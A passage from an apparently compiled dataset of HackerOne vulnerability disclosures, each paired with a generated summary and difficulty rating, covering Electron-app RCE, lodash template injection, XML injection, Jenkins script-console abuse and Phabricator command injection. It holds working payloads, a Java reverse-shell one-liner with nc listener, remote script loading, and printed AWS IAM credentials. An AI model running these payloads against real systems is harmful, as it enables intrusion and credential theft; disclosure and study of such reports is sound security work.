This vulnerability requires understanding of multiple components (ImageMagick's MSL format, SVG file handling, and ownCloud's preview generation) and their subtle interaction. The attack chain is non-obvious, involving file uploads triggering a server-side image processing vulnerability that leads to file writes.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/276031: Remote Code Execution in Rocket.Chat Desktop
================================================================================
RAW DESCRIPTION:

Summary: The Markdown parser can be tricked into allowing arbitrary Javascript leading to "remote code execution".
Description:
By combining the "link" and inline code block we can trick the parser into breaking out of the current HTML attribute.
This allows us to control other attributes of the tag and trigger javascript events.
Code 94 Bytes
1[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';"`hax`zzz)
becomes
Code 159 Bytes
1<a href="&lt;a href=" http:="" hax="" onmouseover="location='https://maustin.net/hax/rocket/hack.html';&quot;&quot;" target="_blank" rel="noopener noreferrer">
This is a simple redirect to: https://maustin.net/hax/rocket/hack.html
From this point the goal is to get the application to call shell.openExternal(href); with a URL we control. Thats because:
"open 'file://localhost/Volumes/Macintosh HD/foo.txt'" opens the document
in the default application for its type (as determined by LaunchSer-
vices).
Note: For this demo I point to file:///Applications/Calculator.app however if you point to a public NFS or SMB server on windows this executable can be controlled by the attacker. (example at: file:///net/192.241.239.91/var/nfs/general/hack2.app)
In https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45 all links are hooked and some patter matching is used to check before firing them off to shell.openExternal(href);
Normally preload javascript is an "isolated scope" in this case however the code is directly attached to the user controlled DOM as the "window.onload" handler. This means we can overload some global objects and methods including the RegExp.prototype.test method. Now we can bypass the file:\/\/ check send our application path to openExternal.
Code 793 Bytes
1<!DOCTYPE html>
2<html>
3    <head>
4      <script>
5        RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
6          apply: function(target, thisArg, argumentsList) {
7            console.log(thisArg.source);
8          console.log(argumentsList[0]);
9          if((thisArg.source == '^file:\\/\\/.+') && (argumentsList[0] === 'file:///Applications/Calculator.app')){
10            return false;
11          }
12          return Reflect.apply(target, thisArg, argumentsList)
13          }
14        });
15        setTimeout(()=>{
16            a = document.createElement("A")
17            a.href="file:///Applications/Calculator.app"
18            document.body.appendChild(a)
19            a.click()
20        }, 3000);
21      </script>
22    </head>
23    <body>
24     <h1>3...2...1...🚀</h1>
25    </body>
26</html>
Releases Affected:
= 2.9.0
Steps To Reproduce (from initial installation to vulnerability):
Create a new channel to test in.
Send the following snippet of markdown:
Code 94 Bytes
1[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';"`hax`zzz)
Move your mouse over the link you just send and
Supporting Material/References:
https://youtu.be/HPlwlc2J-LQ
Suggested mitigation
The markdown parser needs a little love to prevent the initial xss.
I believe you should be able to use something like window.addEventListener("load", .. to execute the checks in the proper scope.



================================================================================
Vulnerability Description:
The vulnerability involves a chain of exploits starting with a Markdown parser flaw that allows XSS, leading to remote code execution by manipulating the application's link handling mechanism to execute arbitrary applications via shell.openExternal.

Steps to Reproduce:
1. Create a new channel in Rocket.Chat
2. Send the following markdown snippet in the channel: [ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';"`hax`zzz)
3. Move mouse over the link to trigger the redirect to the malicious page
4. The malicious page then overrides RegExp.prototype.test to bypass security checks and executes shell.openExternal with a controlled file path
Exploitation Difficulty:
This attack requires deep understanding of multiple components: Markdown parsing quirks, DOM manipulation, JavaScript prototype pollution, and the specific implementation of Rocket.Chat's link handling. The interaction between these components is non-obvious and requires precise manipulation of application state.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/301458: Remote Code Execution in Wordpress Desktop
================================================================================
RAW DESCRIPTION:

An attacker can create a malicious page that when viewed or edited in Wordpress Desktop App will results in remote code execution.
This issue looks to be around this line of code:
https://github.com/Automattic/wp-desktop/blob/develop/desktop/window-handlers/external-links/index.js#L38
If shell.openExternal is sent a file:// url it will try to open that file in the default native application (instead of the default browser). If we pass the an a .app file on MacOS or an exe it will just execute the code.
We also link to a remote readable NFS mount (or windows share) to point to a remote executable.
A Wordpress page is created with:
Code 131 Bytes
1<center><iframe style="border: 0;" src="https://maustin.net/hax/wp_desktop/index.html" width="250" height="250"></iframe></center> 
This file has the following code:
Code 159 Bytes
1   <script>
2      // window.open('file:///Applications/Calculator.app');
3      window.open('file:///net/192.241.239.91/var/nfs/general/hack2.app')
4   </script>
The file at file:///net/192.241.239.91/var/nfs/general/hack2.app is a simple applescript Application with the following code:
Code 147 Bytes
1tell application "Terminal"
2    do script "cat /etc/hosts"
3    display dialog "You just got hacked!"
4end tell
5
6do shell script "open -a Calculator"
POC
Create the setup described above.
Invite any wordpress.com user to edit. (or wait for them to follow you and click on your site in the "reader")
Code is executed when the user views the page.
See attached video for a working POC.
Sugested Fix:
Before passing a url to shell.openExternal the application should validate that it begins with http:// or https://.
Impact
An attacker could target any individual with a wordpress.com account by inviting them to be an editor. When they simply view the page in the desktop application the code would run.
The remote attacker would be able to run any code as the current user on the system once the page is viewed.
In my testing I used a remote wordpress blog (with jetpack) so that I would be able to add an iframe. However I believe with a Business account a custom wordpress plugin could achieve the same result on a wordpress.com hosted account.



================================================================================
Vulnerability Description:
The vulnerability allows remote code execution in WordPress Desktop by exploiting the `shell.openExternal` function, which does not validate URLs before processing them. An attacker can craft a malicious page that, when viewed or edited in the desktop app, executes arbitrary code on the victim's machine.

Steps to Reproduce:
1. Create a WordPress page containing a malicious iframe that points to a remote HTML file.
2. The remote HTML file contains JavaScript that uses `window.open` to execute a local or remote executable file (e.g., `.app` on macOS or `.exe` on Windows).
3. When a WordPress Desktop user views or edits the page, the `shell.openExternal` function in the application processes the `file://` URL, executing the malicious file.
Exploitation Difficulty:
The attack involves multiple components (malicious page, remote HTML, executable file) and requires understanding how `shell.openExternal` handles `file://` URLs. However, the interaction between these components is straightforward once the behavior of `shell.openExternal` is known.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/791293: Modify Host Header which is sent to email
================================================================================
RAW DESCRIPTION:

Summary:
Modify host header and include the fake website in password reset email. Password reset mail is taking source domain from request header host, which can be modified using burp suite and the modified link is sent to the victims email
Steps To Reproduce:
Go to https://da.theendlessweb.com:2222/
Start burp suite
Enter username and click on Send me a Link
Intercep the request and modify the URL to some other custom url
Forward the modified request
Password reset email will be sent.
Check your email and you will see the new url (which was configured in step 4) in the email.
Supporting Material/References:
Snapshots in attachment
Impact
With this, attacker can make any victim to visit their custom website and can affect the victim in many ways



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to modify the Host header in a password reset request, causing the system to send a reset link to a fake website controlled by the attacker. This could lead to phishing attacks or credential theft when the victim clicks the malicious link.

Steps to Reproduce:
1. Go to https://da.theendlessweb.com:2222/
2. Start Burp Suite and intercept the request after entering a username and clicking 'Send me a Link'
3. Modify the 'Host' header in the intercepted request to a fake website URL
4. Forward the modified request
5. Check the victim's email to see the password reset link pointing to the fake website
Exploitation Difficulty:
This vulnerability is straightforward to discover as it only requires intercepting and modifying a single HTTP request header. The attack does not involve complex application states or subtle interactions between components. Manipulating HTTP headers is a common testing technique.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/870615: [Fixed] A vulnerability in KAVKIS 2020 products family allows full disabling of protection
================================================================================
RAW DESCRIPTION:

Note! Thank you for your report. For the purposes of the further analysis of the vulnerability, that you kindly report to us, could you please fill all fields [in square brackets]. This information will help us to respond you more quickly and triage your report. Thanks a lot for your assistance.
I use Translator, T_T Sorry
Summary
can turn off anti-virus functionality in an external process.
Description
Use the SetWindowsHookEx function to inject the DLL. The ClientLoadLibrary was hooked to prevent injection, but dlls with specific file names were injectable(tiptsf.dll). After that, I was able to hook some WinAPIs and turn off antivirus.
Environment
Scope: Application
Product name: Kaspersky Internet Security
Product version:20.0.14.1085
OS name and version (incl SP): Windows 10 RS5
Attack type: Bypass
Maximum user privileges needed to reproduce your issue: no privileges
Steps to reproduce
FindWindow and get hwnd from kaspersky internet security(avpui.exe)
I have invoked the SetWindowsHookEx function to inject the DLL.
After hooking the TrackPopupMenu function, send a pop-up message through PostMessage.
When self-protection is turned on, it generates a new avpui.exe and then generates a Dialog that asks users to confirm. the generated process also injects dll.
In the newly created avpui.exe, hook the IsDialogMessageW function and switch to a message that occurs when you click the OK button.
download ransomware & run.
Impact
The bypass function can be used to turn off the antivirus before the malware is activated.



================================================================================
Vulnerability Description:
A vulnerability in Kaspersky Internet Security 2020 allows an attacker to disable antivirus protection by injecting a DLL (tiptsf.dll) via SetWindowsHookEx, hooking critical functions (TrackPopupMenu, IsDialogMessageW), and bypassing self-protection mechanisms to simulate user confirmation.

Steps to Reproduce:
1. FindWindow and get hwnd from Kaspersky Internet Security (avpui.exe)
2. Invoke SetWindowsHookEx function to inject the DLL (tiptsf.dll)
3. Hook the TrackPopupMenu function and send a pop-up message through PostMessage
4. Hook the IsDialogMessageW function in the newly created avpui.exe to simulate clicking the OK button
5. Download and execute ransomware
Exploitation Difficulty:
The attack involves multiple non-trivial steps (DLL injection, API hooking, process manipulation) and requires understanding of Kaspersky's self-protection behavior. The need to chain hooking of different functions across processes and bypass confirmation dialogs adds complexity, though the techniques themselves are known in offensive security.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/904672: Server-side Template Injection in lodash.js 
================================================================================
RAW DESCRIPTION:

I would like to report Server-side Template Injection in lodash.js (_.template function)
It allows the execution of code on the server
Module
module name: lodash
version: 4.17.15
npm page: https://www.npmjs.com/package/lodash
Module Description
The Lodash library exported as Node.js modules.
Module Stats
26,664,631 weekly downloads
Vulnerability
Vulnerability Description
The _.template function of the lodash package does not properly validate user-supplied input.
An application making use of the lodash package may be exploited by an attacker that controls the value of a parameter processed by the _.template function. An attacker can inject code such as Javascript within parenthesis for example parameter=${JSON.stringify(process.env)} which will be executed by the server.
Steps To Reproduce:
Step 1: Create a test application that requires the lodash.js library. The application below accepts user-supplied input in the 'name' parameter that is handled by lodash _.template function
Code 453 Bytes
1const express = require('express');
2const _ = require('lodash');
3const escapeHTML = require('escape-html');
4const app = express();
5app.get('/', (req, res) => {
6  res.set('Content-Type', 'text/html');
7  const name = req.query.name
8  // Create a template from user input
9  const compiled = _.template("Hello " + escapeHTML(name) + ".");
10  res.status(200).send(compiled());
11});
12
13app.listen(8000, () => {
14  console.log('POC app listening on port 8000!')
15});
Step 2: Visit the vulnerable application at http://127.0.0.1:8000/?name=Test
Step 3: Visit the vulnerable application and enter a payload such as ${JSON.stringify(process.env)} into the name parameter e.g. http://127.0.0.1:8000/?name=Test${JSON.stringify(process.env)}
Supporting Material/References:
OSX 10.15.5
NODEJS v10.16.0
NPM v 6.9.0
Wrap up
I contacted the maintainer to let them know: [Y/N] N
I opened an issue in the related repository: [Y/N] N
Hunter's comments and funny memes goes here
Apologies if I haven't used the ideal terminology or if this is a duplicate.
Impact
Remote code execution



================================================================================
Vulnerability Description:
The _.template function in lodash.js does not properly validate user-supplied input, allowing Server-side Template Injection (SSTI). An attacker can inject and execute arbitrary JavaScript code on the server by controlling the input to the _.template function.

Steps to Reproduce:
1. Create a test application that requires the lodash.js library and uses the _.template function with user-supplied input.
2. Visit the vulnerable application with a payload in the name parameter, e.g., http://127.0.0.1:8000/?name=Test${JSON.stringify(process.env)}
Exploitation Difficulty:
The vulnerability involves a straightforward exploitation of a known template injection flaw in a widely-used library. The attack requires minimal components and no complex interactions or state manipulation.

--------------------------------------------------------------------------------



XML Injection Vulnerabilities (2 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1150799: XML Injection / External Service Interaction (HTTP/DNS) On https://█████████.mil
================================================================================
RAW DESCRIPTION:

Greetings, I found on one of your sites an XML Injection + External service Interaction (DNS/HTTP)
Link of the vulnerable file : https://█████.mil/██████████
Payload XML Injection :
Code 184 Bytes
1<fkpxmlns="http://a.b/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://a.b/http://wiiyjpk3neg58qeu4vb5j8vpcgi86x.burpcollaborator.net/fkp.xsd">fkp</fkp>
(please change the link of burp collaborator and + URL encode the payload)
How to reproduce
█████
(I cut the video because the reception time is 30-40 seconds, it is not very relevant)
here is another payload that works, without XML :
Code 79 Bytes
1http://hzk9we4fcukbidprbvxdhw5iv914pudl0bo0.burpcollaborator.net/?setWarningMsg
(please change the link of burp collaborator)
it is also necessary to wait a little, possibly one minute.
all the ips I receive are from ███.
if you need help, don't hesitate.
fiveguyslover.
Impact
XML Injection + We can use the weakness as a attack proxy to DDOS all Internal/external web conatiners, also could be amplified too
System Host(s)
██████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
Link of the vulnerable file : https://██████.mil/█████████
Payload XML Injection :
Code 184 Bytes
1<fkpxmlns="http://a.b/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://a.b/http://wiiyjpk3neg58qeu4vb5j8vpcgi86x.burpcollaborator.net/fkp.xsd">fkp</fkp>
(please change the link of burp collaborator and + URL encode the payload)
here is another payload that works, without XML :
Code 79 Bytes
1http://hzk9we4fcukbidprbvxdhw5iv914pudl0bo0.burpcollaborator.net/?setWarningMsg
POC Attached
Suggested Mitigation/Remediation Actions



================================================================================
Vulnerability Description:
The vulnerability involves XML Injection and External Service Interaction (HTTP/DNS) on a .mil domain. By injecting malicious XML or HTTP payloads, an attacker can force the server to interact with external services, potentially leading to data exfiltration, SSRF, or amplification attacks.

Steps to Reproduce:
1. Send a crafted XML payload to the vulnerable endpoint: https://█████.mil/██████████ with an external DNS/HTTP reference to a Burp Collaborator instance.
2. Alternatively, send a simple HTTP request to the vulnerable endpoint with a Burp Collaborator URL as a parameter.
Exploitation Difficulty:
The vulnerability requires crafting specific payloads (XML or HTTP) and understanding how the server processes external references. However, the attack vectors are straightforward once the payload format is known, and the interaction logic is not particularly subtle or complex.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/997381: XML Injection on https://www.█████████ (███ parameter)
================================================================================
RAW DESCRIPTION:

Greetings,
I found an XML injection on https://www.███.
This kind of vulnerability can be difficult to detect and exploit remotely; you should review the application's response
here is the complete link: https://www.███/███████
Payload :
███████=<vuc xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://9bligh4snzlirzuxt4lbu3zullrbf0.burpcollaborator.net/foo"/></vuc>
Result :
███
best regards,
frenchvlad
Impact
gaining the access to the unauthorized parts and stealing the sensitive data would be the most important thing to know when it comes to XML’s impact.



================================================================================
Vulnerability Description:
XML Injection vulnerability allows an attacker to inject malicious XML content into a vulnerable parameter, potentially leading to unauthorized data access or server-side request forgery (SSRF). The vulnerability was demonstrated by including an external XML entity that triggered a callback to a Burp Collaborator server.

Steps to Reproduce:
1. Navigate to the vulnerable URL: https://www.███/███████
2. Inject the XML payload into the vulnerable parameter (███ parameter): ███████=<vuc xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://9bligh4snzlirzuxt4lbu3zullrbf0.burpcollaborator.net/foo"/></vuc>
Exploitation Difficulty:
The attack involves a straightforward injection of XML content into a parameter, without requiring multiple components, complex state manipulation, or novel logic. The vulnerability is detected by observing the application's response to the injected payload.

--------------------------------------------------------------------------------



Command Injection - Generic Vulnerabilities (7 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1274695: RCE of Burp  Scanner / Crawler via Clickjacking 
================================================================================
RAW DESCRIPTION:

Burp Suite utilizes an embedded Chrome browser for crawling and scanning web applications. The Chrome instance is launched in headless mode, with remote debugging enabled via the remote-debugging websocket port instead of remote-debugging-pipe. As a result, a known XSS vulnerability in Chrome can be leveraged in combination with a JavaScript port sniffing and ClickJacking attack to compromise the WebSocket GUID for the remote debugging channel. Using the provided remote debugging APIs, it’s possible to trigger a file download to the /Applications/Burp Suite Professional.app/Contents/ directory with a new user.vmoptions file. This will provide the -Xmx5m and -XX:OnOutOfMemoryError=open -a Calculator flags to JVM the next time that Burp Suite is launched. Accordingly, Burp Suite will quickly exhaust the available JVM memory and trigger the supplied OS command.
Based on Google’s security impact guidelines, this issue would typically be considered to have no security impact since Chrome requires additional flags to run (--remote-debugging and --headless) [1]. Additionally, the XSS vector used in this PoC has been public to Chrome since at least 2016 and reported in multiple tickets [2-6]. As a result, we are reporting this as a Burp Suite vulnerability since the named pipe transport could be utilized to mitigate this issue, which is supported by tools like puppeteer (e.g. --remote-debugging-pipe) [7].
POC:
See attached video.
Steps to reproduce:
To confirm this issue, perform the following steps:
Download the attached ‘burp.html’ exploit, and host it on a web server (e.g. python -m http.server)
Launch an instance of Burp Suite, and start a new scan of the web server.
Open a Chrome browser and navigate to the hosted exploit page (e.g. http://127.0.0.1:8000/burp.html)
Observe that a JavaScript port scanner is determining the randomized port listening for Chrome remote debugging. After the port is identified, a clickjacking payload will be rendered on the page.
After clicking the ‘CLICK ME!!!’ button, restart Burp Suite and observe that the Calculator app has been launched.
References:
[1] https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/security-labels.md#TOC-Security_Impact-None
[2] https://bugs.chromium.org/p/chromium/issues/detail?id=607939
[3] https://bugs.chromium.org/p/chromium/issues/detail?id=618333
[4] https://bugs.chromium.org/p/chromium/issues/detail?id=619414
[5] https://bugs.chromium.org/p/chromium/issues/detail?id=775527
[6] https://bugs.chromium.org/p/chromium/issues/detail?id=798163
[7] https://github.com/puppeteer/puppeteer/blob/943477cc1eb4b129870142873b3554737d5ef252/src/node/PipeTransport.ts
Impact
After successful exploitation an attacker can gain control over victim's computer with the same permissions as the user running the scanner.



================================================================================
Vulnerability Description:
Burp Suite's embedded Chrome browser, used for crawling and scanning, is vulnerable to a combination of XSS, port sniffing, and ClickJacking attacks. This allows an attacker to compromise the WebSocket GUID for the remote debugging channel, manipulate the JVM settings, and execute arbitrary commands with the same permissions as the user running Burp Suite.

Steps to Reproduce:
1. Download the attached ‘burp.html’ exploit and host it on a web server (e.g., python -m http.server)
2. Launch an instance of Burp Suite and start a new scan of the web server
3. Open a Chrome browser and navigate to the hosted exploit page (e.g., http://127.0.0.1:8000/burp.html)
4. Observe that a JavaScript port scanner is determining the randomized port listening for Chrome remote debugging
5. After the port is identified, a clickjacking payload will be rendered on the page
6. Click the ‘CLICK ME!!!’ button, restart Burp Suite, and observe that the Calculator app has been launched
Exploitation Difficulty:
The attack involves multiple components (XSS, port sniffing, ClickJacking, remote debugging API manipulation) and requires understanding subtle interactions between these components. Additionally, the attacker must manipulate complex application states (e.g., WebSocket GUID, JVM settings) and use novel logic not commonly found in other applications.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1418891: Apache Flink RCE via GET jar/plan API Endpoint
================================================================================
RAW DESCRIPTION:

Summary:
Aiven has not restricted access to the GET jars/{jar_id}/plan API. This endpoint can be used to load java class files with the specified arguments that are in the java classpath on the server. This can be abused to gain RCE on the Apache Flink Server.
Steps To Reproduce:
The video below shows how to setup the Apache Flink instance and run the PoC. Feel free to use my VPS which will make triaging somewhat easier (ssh ████████, password: ██████):
█████████
Login to my aiven account: ████, password: ██████
Run the SQL job as demonstrated in the video
Open the Flink Web UI and verify that there is a new job in the jobs panel.
Setup netcat reverse shell listener on the VPS: nc -n -lvp 8888
Update the poc.py variables to match your instance, if you are not using my Apache Flink instance
Run the poc: python3 poc.py
Reverse shell connection should pop up
After connection has been closed, the Apache Flink will crash, so the Aiven service daemon will have to restart it. Because of this, you have to run new SQL job after every time you run the poc script
API Request
Here's the HTTP API request that exploits the issue:
Code 717 Bytes
1GET /jars/145df7ff-c71a-4f3a-b77a-ee4055b1bede_a.jar/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load("https://fs.bugbounty.jarijaas.fi/aiven-flink/shell-loader.js")&parallelism=1 HTTP/1.1
2Host: ████
3Connection: keep-alive
4Pragma: no-cache
5Cache-Control: no-cache
6Authorization: Basic █████
7sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"
8Accept: application/json, text/plain, */*
9sec-ch-ua-mobile: ?0
10User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
11sec-ch-ua-platform: "Windows"
12Sec-Fetch-Site: same-origin
13Sec-Fetch-Mode: cors
14Sec-Fetch-Dest: empty
15Accept-Language: en-US,en;q=0.9,fi;q=0.8
Impact
Attacker can execute commands on the server and use this access to potentially pivot into other resources in the network.



================================================================================
Vulnerability Description:
The vulnerability involves unrestricted access to the GET jars/{jar_id}/plan API endpoint in Apache Flink, which allows loading Java class files with specified arguments from the server's classpath. This can be exploited to achieve Remote Code Execution (RCE) on the server.

Steps to Reproduce:
1. Login to the Aiven account and run an SQL job to create a new job in the Flink Web UI.
2. Set up a netcat reverse shell listener on a VPS.
3. Modify and run the provided PoC script (poc.py) to exploit the GET jars/{jar_id}/plan API endpoint.
4. Observe the reverse shell connection to gain RCE on the Apache Flink Server.
Exploitation Difficulty:
The attack requires knowledge of the specific API endpoint and how to manipulate it to load malicious Java classes. It also involves setting up a reverse shell and understanding the interaction between the API and the server's classpath. However, the steps are somewhat straightforward once the endpoint's functionality is understood.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/187542: Brave Browser unexpectedly allows to send arbitrary IPC messages
================================================================================
RAW DESCRIPTION:

Summary:
I found that Brave Browser allows to overwrite the internal js code from the user js code.
Using this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on.
Steps to Reproduce:
1 . An attacker overwrites Function.prototype.call, like this:
Code 196 Bytes
1Function.prototype.call=function(e){
2    if(e[0]&&e[0]=="window-alert"){
3        e[0]="[ARBITRARY_IPC_MESSAGE_HERE]";
4        e[1]="[ARBITRARY_IPC_MESSAGE_HERE]";
5    }
6    return this.apply(e);
7}
2 . An attacker calls alert().
3 . Brave's alert() function calls Function.prototype.call in the internal code. At this time, the overwritten Function.prototype.call is used in the alert internal code.
4 . Function.prototype.call receives IPC messages as arguments. This arguments are replaced to arbitrary messages by step 2's code. Thus, an attacker can send arbitrary IPC messages.
PoC:
I'd like to show three PoCs:
UXSS PoC
(If it goes well, you can see an alert dialog on google's domain.)
Code 666 Bytes
1<script>
2Function.prototype.call=function(e){
3    if(e[0]&&e[0]=="window-alert"){
4        e[0]="dispatch-action";
5        e[1]='{"actionType":"window-new-frame","frameOpts":{"location":"https://www.google.com/ncr"},"openInForeground":true}'
6    }
7    return this.apply(e);
8}
9alert();
10
11setTimeout(function(){
12	for(var windowKey=0;windowKey<10000;windowKey++){
13		Function.prototype.call=function(e){
14			if(e && e[0] && e[0]=="window-alert"){
15				e[0]="dispatch-action";
16				e[1]=`{"actionType":"window-set-url","location":"javascript:alert('document.domain is: '+document.domain)","key":${windowKey}}`
17			}
18			return this.apply(e);
19		}
20		alert();
21	}
22},3000);
23</script>
Address Bar Spoofing PoC
(If it goes well, you can see https://www.google.com/ in address bar.)
Code 246 Bytes
1<script>
2Function.prototype.call=function(e){
3	if(e && e[0] && e[0]=="window-alert"){
4		e[0]="dispatch-action";
5		e[1]='{"actionType":"window-set-navbar-input","location":"https://www.google.com/"}';
6	}
7	return this.apply(e);
8}
9alert();
10</script>
Change browser settings PoC
(If it goes well, your home page is changed to http://attacker.example.com/ . You can see it in about:preferences. )
Code 281 Bytes
1<script>
2Function.prototype.call=function(e){
3    if(e[0]&&e[0]=="window-alert"){
4        e[0]="dispatch-action";
5        e[1]='{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}'
6    }
7    return this.apply(e);
8}
9alert();
10</script>
FYI, Electron has similar issues. I reported it to Electron team and they are working on it.
Could you confirm this bug?
Thanks!



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to overwrite internal JavaScript functions in Brave Browser, specifically Function.prototype.call, to intercept and modify IPC messages. This can lead to UXSS, address bar spoofing, and changing browser settings by sending arbitrary IPC messages.

Steps to Reproduce:
1. An attacker overwrites Function.prototype.call to intercept and modify IPC messages
2. The attacker calls alert(), which triggers the modified Function.prototype.call to send arbitrary IPC messages
Exploitation Difficulty:
The attack requires understanding of JavaScript prototype manipulation and IPC message handling in Brave Browser. The interaction between overwriting Function.prototype.call and the internal use of this function in alert() is subtle and non-obvious.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2083771:  Remote Code Execution and AWS IAM Credentials Exfiltration in https://████████/
================================================================================
RAW DESCRIPTION:

Description:
The host https://██████/ has /jenkins/script directory enabled that allows user to execute system command in the host.
References
https://hackerone.com/reports/768266
Impact
Attacker can use the IAM credentials to manage various AWS resources, create and delete resources, read and write data in AWS services, create and manage other IAM users and roles, access the AWS Management Console, use the AWS Command Line Interface (CLI). In addition, attacker can obtain a reverse shell and takeover the vulnerable server.
System Host(s)
█████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
Go to https://███/jenkins/script and enter the following command and click on run.
println "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup".execute().text
Code 1.18 KiB
1{
2  "Code" : "Success",
3  "LastUpdated" : "2023-07-25T15:06:03Z",
4  "Type" : "AWS-HMAC",
5  "AccessKeyId" : "ASIAVAYADSOPOZ46OKUF",
6  "SecretAccessKey" : "zktjDluq7fiPeRPZ/Ptdj0f/RpifcpiverrHZPY9",
7  "Token" : "FwoDYXdzEC4aDOSTrvC1+12bsyz/YCLpBJSWuycc/qloo+gbOS0H0HDHj+qAV6rldadbawPMkpUC2kyF9UW3rayH29j3MQNMDDxoPZTpnWLYuIbBl1iaYciwrOVemd6OTSDTyoAz9JjO1Cc3svhv58rhTx1c+FWpQKxtOgiLPEJWT/sPfdEJDAcLoXfyDi7lLWD5ydyHuKWngG8ZBG/5Ik170XOpYeZpSpJ/pspBNnzbf5dPJo/QVNWN+hoY8+WrK4Hko7y04Z/ZwJWO3Q6DYVM2OSARheKUnih8NrX6pROliySxRzj3fedhz2h95axbt+up+HwvszZv+ksQmZdAOFL4iI8oXWF6RgWz7Mkyot+o+Zk4fKRBZOad0iDg0NjaNvZSOWHCx+Bd55lq/rMmthcYubHgGtLXS8F9cJShYjysU9pDK9M7Hd644KmSVgvRe0pCV4GgwOAqKdSYVQn7A2cBeO4ROL712adCz8wzYDMRavHK8mfeKCd5qAfrd7z7BGIiaIeEYJ52CglOpUFywMnlmPNN1V/Rvih1YX0Ndq0yNso9Rj1FUtiLTWysCkm/YGCK68TILlEX7UaJV3keGpMkpCULsGkcH23RZmp8NjYoIf7okJ28ygVW4GYWF48MWVm96HWDRGJ951x3IOIZBdOhgKrVRQJLUXgVjDwm1QroAyYTRSiLw9YrR5jmN6ONfYnyh06qpl1PUz8C1+iXtRQIjzWjaaHLh2YQERTIo/ejCERtoM/AEjhB6DhdlroSvuPNjD03NPYtxd87vUuG7gsZSYqXOOsU3sYiJra3UrbA9vFR/BmnJcXbxcsWMtCCs9syRp9r+2V3qT6ppN2i5Im9KI/K/6UGMkHbC2LUgZo1VIbWCrN+ePxqijy1CUe9r98gOm9Z2rxKQ+CfKjPJo0nvYc3Z8UmxqKpeG2dtOpW8OYuQZivCMR5ifg==",
8  "Expiration" : "2023-07-25T21:32:22Z"
9}
IAM Credentials will be disclosed.
To get a reverse shell use this command.
In vulnerable host
Code 561 Bytes
1String host="your_server_ip";
2int port=1337;
3String cmd="bash";
4Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
In your host
Code 13 Bytes
1nc -nvlp 1337
You will receive a reverse shell as user jenkins.
██████
Suggested Mitigation/Remediation Actions
Restrict access to /jenkins/script directory.



================================================================================
Vulnerability Description:
The vulnerability allows remote code execution via an unprotected Jenkins script console endpoint (/jenkins/script), enabling attackers to execute system commands, retrieve AWS IAM credentials from the instance metadata service, and gain full control of the server through reverse shells.

Steps to Reproduce:
1. Navigate to https://█████/jenkins/script
2. Enter the command `println "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup".execute().text` and click 'Run' to retrieve AWS IAM credentials.
3. For reverse shell, execute the provided Java code snippet in the script console after setting up a listener with `nc -nvlp 1337` on your server.
Exploitation Difficulty:
While the attack involves multiple components (Jenkins script console, AWS metadata service, reverse shell setup), each step is straightforward and well-documented in security research. The vulnerability follows common patterns seen in cloud environment misconfigurations.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/288704: Command injection on Phabricator instance with an evil hg branch name
================================================================================
RAW DESCRIPTION:

Hi phabricator,
I found an evil branch name of hg a repo can lead to arbitrary command injection on phabricator instance.
Here is the reproduction steps:
Monitor a remote mercurial repo with phabricator;
Create a branch and called "--config=hooks.pre-log=wget" on the remote;
After phabricator update the remote repo,visit the history page of that crafted branch;
Code 77 Bytes
1http://instanceip/source/hgclone/history/--config%253Dhooks.pre-log%253Dwget/
It will raise an error like below and the wget command will be executed;
I test this issue both on my own server instance and the cloud instance with mercurial 4.4(latest) installed(on my server).
Code 598 Bytes
1Command failed with error #255! COMMAND hg --config ui.ssh='/data/phabricator/phabricator/bin/ssh-
2connect' log --debug --template '{node};{parents}\n' --limit 101 -b '--config=hooks.pre-log=wget' --rev 
3'reverse(ancestors('\''84e8c5feb4faba2f1b230575e747c3bffe7c7a3c'\''))' STDOUT running hook pre-log: 
4wget STDERR not trusting file /var/repo/3/.hg/hgrc from untrusted user root, group root not trusting file 
5/var/repo/3/.hg/hgrc from untrusted user root, group root wget: missing URL Usage: wget [OPTION]... 
